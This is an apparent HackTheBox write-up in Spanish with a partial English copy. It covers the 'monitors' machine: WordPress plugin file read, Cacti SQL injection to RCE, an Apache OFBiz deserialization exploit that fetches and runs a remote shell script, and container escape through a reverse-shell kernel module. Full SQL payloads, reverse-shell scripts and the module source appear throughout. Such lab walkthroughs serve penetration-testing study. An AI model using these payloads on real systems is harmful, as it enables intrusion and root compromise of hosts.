@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>monitors | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">monitors</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un WordPress con el plugin vulnerable wp-with-spritz, permitiendo un ataque de Remote File Inclusion (RFI) para leer archivos del sistema. Mediante esta vulnerabilidad, descubrí un subdominio oculto ejecutando Cacti, donde obtuve acceso inicial explotando una inyección SQL (CVE-2020-14295) que me permitió ejecutar comandos remotos como <code>www-data</code>.</p>
+
+                    <p>Tras la enumeración del sistema, encontré credenciales de respaldo en un script de backup que me otorgaron acceso SSH como el usuario <code>marcus</code>. El usuario tenía acceso a un servicio Apache OFBiz ejecutándose localmente en el puerto 8443, vulnerable a deserialización insegura (CVE-2020-9496), lo que me permitió obtener una shell como root dentro de un contenedor Docker.</p>
+
+                    <p>Para escapar del contenedor al sistema host, aproveché la capability <code>CAP_SYS_MODULE</code>, que permitía cargar módulos del kernel. Creé un módulo malicioso que ejecutaba una reverse shell, compilándolo con los headers del kernel del host y cargándolo con <code>insmod</code>, obteniendo finalmente acceso root en la máquina real.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> WordPress plugin RFI (wp-with-spritz 4.2.4), Cacti SQLi RCE (CVE-2020-14295), Apache OFBiz deserialization RCE (CVE-2020-9496), container escape mediante CAP_SYS_MODULE con módulo kernel personalizado.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Empiezo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+                <p><img src="./media/image2.png" alt="Escaneo de nmap mostrando los puertos 22 (SSH) y 80 (HTTP) abiertos en la máquina objetivo" /></p>
+
+                <p>El escaneo revela que los puertos 22 (SSH) y 80 (HTTP) están abiertos. Al acceder al servidor web en el puerto 80, encuentro una redirección que requiere añadir <code>monitors.htb</code> al archivo <code>/etc/hosts</code>.</p>
+
+                <h2>Enumeración Web - WordPress</h2>
+                <p>Tras agregar la entrada DNS, accedo al sitio web y veo esta configuración:</p>
+                <p><img src="./media/image3.png" alt="Página web principal mostrando el sitio WordPress de monitors.htb" /></p>
+
+                <p>En el footer del sitio identifico que se trata de un WordPress:</p>
+                <pre><code class="language-plaintext">Iconic One Theme | Powered by Wordpress</code></pre>
+
+                <p>Ejecuto <code>wpscan</code> para enumerar información del CMS y descubro varios detalles importantes:</p>
+                <ul>
+                    <li><strong>Versión de WordPress:</strong> 5.5.1</li>
+                    <li><strong>Tema:</strong> Iconic One versión 3.2.4</li>
+                    <li><strong>XMLRPC:</strong> Habilitado</li>
+                    <li><strong>Plugin encontrado:</strong> wp-with-spritz versión 4.2.4</li>
+                </ul>
+
+                <p>Durante la enumeración también descubro el usuario <code>marcus</code>:</p>
+                <p><img src="./media/image4.png" alt="Enumeración de usuarios mostrando el usuario marcus en WordPress" /></p>
+
+                <h3>Investigación de Vulnerabilidades</h3>
+                <p>Investigo vulnerabilidades conocidas para WordPress 5.5.1 y encuentro CVE-2020-28035 y CVE-2020-28036, que permiten escalada de privilegios mediante XMLRPC, pero no encuentro PoCs públicas funcionales.</p>
+
+                <p>Para el plugin <code>wp-with-spritz</code>, encuentro una vulnerabilidad crítica de Remote File Inclusion (RFI): <a href="https://www.exploit-db.com/exploits/44544">https://www.exploit-db.com/exploits/44544</a></p>
+
+                <h3>Explotación del RFI - Lectura de Archivos</h3>
+                <p>Utilizo la vulnerabilidad RFI del plugin para leer archivos del sistema. Apuntando a <code>wp-config.php</code>, obtengo credenciales de la base de datos:</p>
+                <pre><code class="language-bash">curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php</code></pre>
+
+                <p>Las credenciales descubiertas son:</p>
+                <pre><code class="language-php">define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wpadmin' );
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+define( 'DB_HOST', 'localhost' );</code></pre>
+
+                <p>Intento reusar estas credenciales para el usuario <code>marcus</code> vía SSH, pero no funcionan. También pruebo a usar el RFI para ejecutar código PHP servido desde mi máquina, pero el código siempre aparece comentado en la respuesta:</p>
+                <p><img src="./media/image1.png" alt="Salida mostrando código PHP comentado al intentar RFI con ejecución de código" /></p>
+
+                <h3>Descubrimiento de Subdominio</h3>
+                <p>Utilizo el RFI para leer las configuraciones de Apache en <code>/etc/apache2/sites-enabled/</code>:</p>
+                <pre><code class="language-bash">curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../etc/apache2/sites-enabled/000-default.conf</code></pre>
+
+                <p>La respuesta revela la existencia de archivos de configuración adicionales:</p>
+                <pre><code class="language-plaintext"># Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf</code></pre>
+
+                <p>Leyendo <code>cacti-admin.monitors.htb.conf</code>, descubro un nuevo virtual host:</p>
+                <pre><code class="language-apache">ServerAdmin admin@monitors.htb
+ServerName cacti-admin.monitors.htb
+DocumentRoot /usr/share/cacti
+ServerAlias cacti-admin.monitors.htb</code></pre>
+
+                <p>Añado <code>cacti-admin.monitors.htb</code> al archivo <code>/etc/hosts</code> y accedo al subdominio.</p>
+
+                <h2>Explotación de Cacti - SQLi a RCE</h2>
+                <p>Al acceder a <code>cacti-admin.monitors.htb</code>, encuentro un panel de login de Cacti:</p>
+                <p><img src="./media/image6.png" alt="Panel de login de Cacti mostrando el formulario de autenticación" /></p>
+
+                <p>Pruebo las credenciales por defecto <code>admin:admin</code> sin éxito. También intento acceder a <code>/etc/cacti/debian.php</code> mediante el RFI para obtener credenciales, pero no tengo permisos de lectura. Finalmente, pruebo con las credenciales obtenidas anteriormente:</p>
+                <pre><code class="language-plaintext">admin:BestAdministrator@2020!</code></pre>
+
+                <p>¡Consigo acceso al panel de administración de Cacti!</p>
+
+                <h3>CVE-2020-14295 - SQL Injection a RCE</h3>
+                <p>Investigo vulnerabilidades de Cacti y descubro CVE-2020-14295, una inyección SQL que puede derivar en ejecución remota de código: <a href="https://nvd.nist.gov/vuln/detail/cve-2020-14295">https://nvd.nist.gov/vuln/detail/cve-2020-14295</a></p>
+
+                <p>Encuentro un exploit funcional en: <a href="https://www.exploit-db.com/exploits/49810">https://www.exploit-db.com/exploits/49810</a></p>
+
+                <p>El exploit funciona de la siguiente manera:</p>
+                <ol>
+                    <li>Utiliza una inyección SQL en el parámetro <code>filter</code> del endpoint <code>color.php</code></li>
+                    <li>Mediante UNION SELECT, extrae información de usuarios y modifica el ajuste <code>path_php_binary</code></li>
+                    <li>Reemplaza <code>path_php_binary</code> con un payload de reverse shell</li>
+                    <li>Dispara la ejecución accediendo a <code>/cacti/host.php?action=reindex</code></li>
+                </ol>
+
+                <p>El payload SQL utilizado es:</p>
+                <pre><code class="language-python">payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"</code></pre>
+
+                <p>Preparo mi listener de netcat y ejecuto el exploit:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-bash">python3 cacti-sqli.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020!</code></pre>
+
+                <p>Recibo la reverse shell como usuario <code>www-data</code>:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 50300
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data</code></pre>
+
+                <h2>Escalada de Privilegios - Usuario marcus</h2>
+                <p>Tras obtener acceso como <code>www-data</code>, confirmo que el usuario <code>marcus</code> existe en el sistema mirando <code>/home</code> y <code>/etc/passwd</code>.</p>
+
+                <p>Exploro el directorio home de <code>marcus</code> y noto que tengo permisos de lectura en algunos archivos, pero no puedo acceder a <code>user.txt</code>, <code>note.txt</code> ni al directorio <code>.backup</code>.</p>
+
+                <h3>Descubrimiento de Script de Backup</h3>
+                <p>Busco archivos relacionados con el directorio backup:</p>
+                <pre><code class="language-bash">find / -iname "*backup*" 2>/dev/null</code></pre>
+
+                <p>Encuentro un servicio systemd interesante:</p>
+                <pre><code class="language-plaintext">/etc/systemd/system/cacti-backup.service</code></pre>
+
+                <p>Inspeccionando el contenido del servicio:</p>
+                <pre><code class="language-ini">[Unit]
+Description=Cacti Backup Service
+After=network.target
+
+[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+
+                <p>El servicio ejecuta un script como <code>www-data</code>, lo que significa que tengo permisos para leerlo:</p>
+                <pre><code class="language-bash">cat /home/marcus/.backup/backup.sh</code></pre>
+
+                <p>El contenido del script revela credenciales:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+backup_name="cacti_backup"
+config_pass="VerticalEdge2020"
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip</code></pre>
+
+                <p>Pruebo las credenciales <code>marcus:VerticalEdge2020</code> vía SSH y gano acceso como usuario <code>marcus</code>, obteniendo la flag de usuario.</p>
+
+                <p>En el directorio home de <code>marcus</code> encuentro un archivo <code>note.txt</code> interesante:</p>
+                <pre><code class="language-plaintext">TODO:
+Disable phpinfo in php.ini - DONE
+Update docker image for production use -</code></pre>
+
+                <p>Esta nota menciona Docker, lo cual será relevante más adelante.</p>
+
+                <h2>Enumeración Post-Explotación - Apache OFBiz</h2>
+                <p>Ejecuto <code>ss -tuln</code> para ver puertos abiertos localmente y descubro el puerto 8443:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>Realizo port forwarding con SSH para inspeccionar el servicio:</p>
+                <pre><code class="language-bash">ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238</code></pre>
+
+                <p>Accediendo a <code>https://localhost:8443</code>, descubro Apache OFBiz ejecutándose:</p>
+                <p><img src="./media/image5.png" alt="Interfaz web de Apache OFBiz mostrando la página principal del servicio" /></p>
+
+                <p>El sitio sugiere credenciales por defecto <code>admin:ofbiz</code>, pero no funcionan en el login: <code>https://localhost:8443/webtools/control/login</code></p>
+
+                <p>En el footer identifico la versión exacta:</p>
+                <pre><code class="language-plaintext">Powered by Apache OFBiz. Release 17.12.01</code></pre>
+
+                <h3>CVE-2020-9496 - Deserialización Insegura</h3>
+                <p>Investigo vulnerabilidades para esta versión y encuentro CVE-2020-9496, una vulnerabilidad de deserialización insegura en el endpoint XML-RPC: <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-9496">https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-9496</a></p>
+
+                <blockquote>
+                    <p>"La petición de XML-RPC es vulnerable a problemas de deserialización no segura y Cross-Site Scripting en Apache OFBiz versión 17.12.03"</p>
+                </blockquote>
+
+                <p>Encuentro exploits para este CVE:</p>
+                <ul>
+                    <li><a href="https://www.exploit-db.com/exploits/50178">https://www.exploit-db.com/exploits/50178</a></li>
+                    <li><a href="https://github.com/g33xter/CVE-2020-9496">https://github.com/g33xter/CVE-2020-9496</a></li>
+                </ul>
+
+                <p>El exploit de exploit-db tiene un enlace roto al archivo JAR de ysoserial, así que lo descargo directamente del repositorio original: <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+
+                <p>También instalo Java 11 en mi máquina para poder compilar los payloads.</p>
+
+                <h3>Modificación del Exploit</h3>
+                <p>El exploit original no funciona correctamente, así que lo modifico para usar Java 11 específicamente y cambio el payload de reverse shell. La función principal modificada es:</p>
+                <pre><code class="language-bash">function webRequest(){
+    echo -e "[*] Generating a JAR payload\n"
+    payload=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
+    
+    echo -e "[*] Sending malicious shell to server...\n" && sleep 3
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k -H 'Content-Type:application/xml' &>/dev/null
+    
+    echo -e "[*] Generating a second JAR payload"
+    payload2=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
+    
+    echo -e "\n[*] Executing the payload in the server...\n" && sleep 3
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" -k -H 'Content-Type:application/xml' &>/dev/null
+    
+    echo -e "\n[*]Deleting Files..."
+}</code></pre>
+
+                <p>Creo un archivo <code>shell.sh</code> con múltiples métodos de reverse shell para mayor compatibilidad:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+export RHOST="10.10.16.3"
+export RPORT="443"
+
+bash -c "bash -i >& /dev/tcp/\$RHOST/\$RPORT 0>&1" 2>/dev/null || \
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$RHOST",$RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])' 2>/dev/null || \
+nc -e /bin/sh $RHOST $RPORT 2>/dev/null</code></pre>
+
+                <h3>Ejecución del Exploit</h3>
+                <p>El ataque funciona en dos fases:</p>
+                <ol>
+                    <li><strong>Primera fase:</strong> Compila un payload ysoserial con <code>CommonsBeanutils1</code> que ejecuta un <code>wget</code> para descargar <code>shell.sh</code> desde mi máquina y guardarlo en <code>/tmp/shell.sh</code></li>
+                    <li><strong>Segunda fase:</strong> Compila otro payload que ejecuta <code>bash /tmp/shell.sh</code>, disparando la reverse shell</li>
+                </ol>
+
+                <p>Preparo el entorno para el ataque:</p>
+                <pre><code class="language-bash"># Servir shell.sh por HTTP
+python3 -m http.server 80</code></pre>
+
+                <pre><code class="language-bash"># Listener para la reverse shell
+sudo nc -lvnp 443</code></pre>
+
+                <p>Ejecuto el exploit modificado:</p>
+                <pre><code class="language-bash">bash ofbiz_pwn.sh -i http://10.10.16.3 -p 443</code></pre>
+
+                <p>Mi servidor HTTP recibe la petición:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.238 - - "GET /shell.sh HTTP/1.1" 200 -</code></pre>
+
+                <p>Y recibo la reverse shell como root:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 60224
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@067381cad370:/usr/src/apache-ofbiz-17.12.01# whoami
+root</code></pre>
+
+                <p>Sin embargo, noto rápidamente que estoy dentro de un contenedor Docker, no en la máquina host. El hostname <code>067381cad370</code> y la estructura del sistema lo confirman.</p>
+
+                <h2>Container Escape - CAP_SYS_MODULE</h2>
+                <p>Tras confirmar que estoy en un contenedor, investigo métodos para escapar al sistema host. El primer paso es verificar las capabilities del contenedor:</p>
+                <pre><code class="language-bash">capsh --print</code></pre>
+
+                <p>La salida revela una capability crítica:</p>
+                <pre><code class="language-plaintext">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</code></pre>
+
+                <p>La capability <code>CAP_SYS_MODULE</code> está habilitada, lo que permite cargar módulos del kernel. Esto es extremadamente peligroso ya que los módulos del kernel se ejecutan con privilegios máximos en el host, no en el contenedor.</p>
+
+                <h3>Módulo Kernel Malicioso</h3>
+                <p>Encuentro una guía detallada para escapar del contenedor mediante esta capability: <a href="https://blog.nody.cc/posts/container-breakouts-part2/#cap_sys_module--load-kernel-module">https://blog.nody.cc/posts/container-breakouts-part2/#cap_sys_module--load-kernel-module</a></p>
+
+                <p>Creo un módulo del kernel en C que ejecutará una reverse shell en el contexto del host. El código del módulo (<code>reverse-shell.c</code>) es:</p>
+                <pre><code class="language-c">#include <linux/kmod.h>
+#include <linux/module.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.3/443 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);</code></pre>
+
+                <p>Este módulo utiliza <code>call_usermodehelper()</code> para ejecutar comandos en el espacio de usuario del host cuando el módulo se carga.</p>
+
+                <h3>Compilación del Módulo</h3>
+                <p>Para compilar el módulo, necesito los headers del kernel del host. Verifico la versión del kernel:</p>
+                <pre><code class="language-bash">uname -r</code></pre>
+
+                <pre><code class="language-plaintext">4.15.0-151-generic</code></pre>
+
+                <p>Creo un Makefile adaptado a mi entorno:</p>
+                <pre><code class="language-makefile">obj-m +=reverse-shell.o
+
+all:
+	make -C /lib/modules/4.15.0-142-generic/build M=/root modules
+
+clean:
+	make -C /lib/modules/4.15.0-142-generic/build M=/root clean</code></pre>
+
+                <p>Compilo el módulo del kernel:</p>
+                <pre><code class="language-bash">make</code></pre>
+
+                <p>La compilación genera varios archivos, siendo el más importante <code>reverse-shell.ko</code>, que es el módulo kernel compilado:</p>
+                <pre><code class="language-plaintext">make -C /lib/modules/4.15.0-142-generic/build M=/root modules
+make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
+  CC [M]  /root/reverse-shell.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/reverse-shell.mod.o
+  LD [M]  /root/reverse-shell.ko
+make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'</code></pre>
+
+                <h3>Escape Final del Contenedor</h3>
+                <p>Preparo un nuevo listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Cargo el módulo malicioso con <code>insmod</code>:</p>
+                <pre><code class="language-bash">insmod reverse-shell.ko</code></pre>
+
+                <p>Al cargar el módulo, este se ejecuta en el contexto del kernel del host, no del contenedor, por lo que la reverse shell se origina desde el sistema host real:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 32782
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitors:/# whoami
+root
+root@monitors:/# hostname
+monitors</code></pre>
+
+                <p>¡He escapado exitosamente del contenedor y ahora tengo acceso root en la máquina host real! Puedo verificar que ya no estoy en el contenedor observando el hostname <code>monitors</code> en lugar del ID del contenedor anterior.</p>
+
+                <p>Finalmente, obtengo la flag de root:</p>
+                <pre><code class="language-bash">cat /root/root.txt</code></pre>
+            </div>
+
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running WordPress with the vulnerable wp-with-spritz plugin, allowing a Remote File Inclusion (RFI) attack to read system files. Through this vulnerability, I discovered a hidden subdomain running Cacti, where I gained initial access by exploiting a SQL injection vulnerability (CVE-2020-14295) that allowed me to execute remote commands as <code>www-data</code>.</p>
+
+                    <p>After system enumeration, I found backup credentials in a backup script that granted me SSH access as user <code>marcus</code>. The user had access to an Apache OFBiz service running locally on port 8443, vulnerable to insecure deserialization (CVE-2020-9496), which allowed me to obtain a shell as root inside a Docker container.</p>
+
+                    <p>To escape from the container to the host system, I leveraged the <code>CAP_SYS_MODULE</code> capability, which allowed loading kernel modules. I created a malicious module that executed a reverse shell, compiling it with the host's kernel headers and loading it with <code>insmod</code>, finally obtaining root access on the real machine.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> WordPress plugin RFI (wp-with-spritz 4.2.4), Cacti SQLi RCE (CVE-2020-14295), Apache OFBiz deserialization RCE (CVE-2020-9496), container escape via CAP_SYS_MODULE with custom kernel module.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and running services:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan showing ports 22 (SSH) and 80 (HTTP) open on the target machine" /></p>
+
+                <p>The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. When accessing the web server on port 80, I encounter a redirection requiring me to add <code>monitors.htb</code> to the <code>/etc/hosts</code> file.</p>
+
+                <h2>Web Enumeration - WordPress</h2>
+                <p>After adding the DNS entry, I access the website and see this configuration:</p>
+                <p><img src="./media/image3.png" alt="Main web page showing the WordPress site for monitors.htb" /></p>
+
+                <p>In the site's footer, I identify that it's running WordPress:</p>
+                <pre><code class="language-plaintext">Iconic One Theme | Powered by Wordpress</code></pre>
+
+                <p>I run <code>wpscan</code> to enumerate CMS information and discover several important details:</p>
+                <ul>
+                    <li><strong>WordPress Version:</strong> 5.5.1</li>
+                    <li><strong>Theme:</strong> Iconic One version 3.2.4</li>
+                    <li><strong>XMLRPC:</strong> Enabled</li>
+                    <li><strong>Plugin found:</strong> wp-with-spritz version 4.2.4</li>
+                </ul>
+
+                <p>During enumeration, I also discover the user <code>marcus</code>:</p>
+                <p><img src="./media/image4.png" alt="User enumeration showing the marcus user in WordPress" /></p>
+
+                <h3>Vulnerability Research</h3>
+                <p>I investigate known vulnerabilities for WordPress 5.5.1 and find CVE-2020-28035 and CVE-2020-28036, which allow privilege escalation through XMLRPC, but I can't find functional public PoCs.</p>
+
+                <p>For the <code>wp-with-spritz</code> plugin, I find a critical Remote File Inclusion (RFI) vulnerability: <a href="https://www.exploit-db.com/exploits/44544">https://www.exploit-db.com/exploits/44544</a></p>
+
+                <h3>RFI Exploitation - File Reading</h3>
+                <p>I use the plugin's RFI vulnerability to read system files. Pointing to <code>wp-config.php</code>, I obtain database credentials:</p>
+                <pre><code class="language-bash">curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php</code></pre>
+
+                <p>The discovered credentials are:</p>
+                <pre><code class="language-php">define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wpadmin' );
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+define( 'DB_HOST', 'localhost' );</code></pre>
+
+                <p>I attempt to reuse these credentials for user <code>marcus</code> via SSH, but they don't work. I also try using the RFI to execute PHP code served from my machine, but the code always appears commented in the response:</p>
+                <p><img src="./media/image1.png" alt="Output showing commented PHP code when attempting RFI with code execution" /></p>
+
+                <h3>Subdomain Discovery</h3>
+                <p>I use the RFI to read Apache configurations in <code>/etc/apache2/sites-enabled/</code>:</p>
+                <pre><code class="language-bash">curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../etc/apache2/sites-enabled/000-default.conf</code></pre>
+
+                <p>The response reveals the existence of additional configuration files:</p>
+                <pre><code class="language-plaintext"># Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf</code></pre>
+
+                <p>Reading <code>cacti-admin.monitors.htb.conf</code>, I discover a new virtual host:</p>
+                <pre><code class="language-apache">ServerAdmin admin@monitors.htb
+ServerName cacti-admin.monitors.htb
+DocumentRoot /usr/share/cacti
+ServerAlias cacti-admin.monitors.htb</code></pre>
+
+                <p>I add <code>cacti-admin.monitors.htb</code> to the <code>/etc/hosts</code> file and access the subdomain.</p>
+
+                <h2>Cacti Exploitation - SQLi to RCE</h2>
+                <p>When accessing <code>cacti-admin.monitors.htb</code>, I find a Cacti login panel:</p>
+                <p><img src="./media/image6.png" alt="Cacti login panel showing the authentication form" /></p>
+
+                <p>I try the default credentials <code>admin:admin</code> without success. I also attempt to access <code>/etc/cacti/debian.php</code> via RFI to obtain credentials, but I don't have read permissions. Finally, I try the credentials obtained earlier:</p>
+                <pre><code class="language-plaintext">admin:BestAdministrator@2020!</code></pre>
+
+                <p>I successfully gain access to the Cacti administration panel!</p>
+
+                <h3>CVE-2020-14295 - SQL Injection to RCE</h3>
+                <p>I investigate Cacti vulnerabilities and discover CVE-2020-14295, a SQL injection that can lead to remote code execution: <a href="https://nvd.nist.gov/vuln/detail/cve-2020-14295">https://nvd.nist.gov/vuln/detail/cve-2020-14295</a></p>
+
+                <p>I find a working exploit at: <a href="https://www.exploit-db.com/exploits/49810">https://www.exploit-db.com/exploits/49810</a></p>
+
+                <p>The exploit works as follows:</p>
+                <ol>
+                    <li>Uses SQL injection in the <code>filter</code> parameter of the <code>color.php</code> endpoint</li>
+                    <li>Via UNION SELECT, extracts user information and modifies the <code>path_php_binary</code> setting</li>
+                    <li>Replaces <code>path_php_binary</code> with a reverse shell payload</li>
+                    <li>Triggers execution by accessing <code>/cacti/host.php?action=reindex</code></li>
+                </ol>
+
+                <p>The SQL payload used is:</p>
+                <pre><code class="language-python">payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"</code></pre>
+
+                <p>I prepare my netcat listener and execute the exploit:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-bash">python3 cacti-sqli.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020!</code></pre>
+
+                <p>I receive the reverse shell as user <code>www-data</code>:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 50300
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data</code></pre>
+
+                <h2>Privilege Escalation - User marcus</h2>
+                <p>After gaining access as <code>www-data</code>, I confirm that user <code>marcus</code> exists on the system by checking <code>/home</code> and <code>/etc/passwd</code>.</p>
+
+                <p>I explore marcus's home directory and notice I have read permissions on some files, but cannot access <code>user.txt</code>, <code>note.txt</code>, or the <code>.backup</code> directory.</p>
+
+                <h3>Backup Script Discovery</h3>
+                <p>I search for files related to the backup directory:</p>
+                <pre><code class="language-bash">find / -iname "*backup*" 2>/dev/null</code></pre>
+
+                <p>I find an interesting systemd service:</p>
+                <pre><code class="language-plaintext">/etc/systemd/system/cacti-backup.service</code></pre>
+
+                <p>Inspecting the service content:</p>
+                <pre><code class="language-ini">[Unit]
+Description=Cacti Backup Service
+After=network.target
+
+[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+
+                <p>The service runs a script as <code>www-data</code>, which means I have permissions to read it:</p>
+                <pre><code class="language-bash">cat /home/marcus/.backup/backup.sh</code></pre>
+
+                <p>The script content reveals credentials:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+backup_name="cacti_backup"
+config_pass="VerticalEdge2020"
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip</code></pre>
+
+                <p>I try the credentials <code>marcus:VerticalEdge2020</code> via SSH and gain access as user <code>marcus</code>, obtaining the user flag.</p>
+
+                <p>In marcus's home directory, I find an interesting <code>note.txt</code> file:</p>
+                <pre><code class="language-plaintext">TODO:
+Disable phpinfo in php.ini - DONE
